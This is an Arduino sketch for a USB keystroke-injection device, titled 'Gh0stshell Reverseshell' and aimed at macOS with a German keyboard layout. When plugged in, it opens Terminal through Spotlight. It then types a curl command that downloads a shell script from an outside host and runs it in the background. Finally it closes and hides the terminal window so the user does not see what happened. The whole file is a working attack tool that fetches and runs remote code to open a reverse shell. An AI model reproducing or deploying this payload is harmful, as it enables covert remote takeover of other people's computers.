/*

Gh0stshell Reverseshell

Target: OSX


open terminal
curl download shell-script and execute it

 
*/



//#include "Keyboard.h"
// GERMAN KEYBOARD LAYOUT
#include "Keyboard_DE.h"


void setup() {
Keyboard.begin();
delay(3000);

// PRESS CMD + SPACE     
Keyboard.press(KEY_LEFT_GUI);
delay(1000);
Keyboard.press(' ');
Keyboard.releaseAll();
delay(300);

// START TERMINAL
Keyboard.println("terminal");
delay(500);
Keyboard.press(KEY_RETURN);
delay(300);

// DOWNLOAD SHELL-SCRIPT
Keyboard.println("curl https://wslab.de/osx_rev_shell.sh -o shell.sh\n");
delay(1000);
Keyboard.press(KEY_RETURN);

// EXECUTE SHELL-SCRIPT
delay(500);
Keyboard.println("bash shell.sh &\n");
Keyboard.press(KEY_RETURN);

// HIDE SHELL
//delay(2000);
Keyboard.println("exit\n");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('h');
Keyboard.releaseAll();

// RELEASE ALL AND WAIT 1h
Keyboard.releaseAll();
delay(60000);
}
void loop() {

}
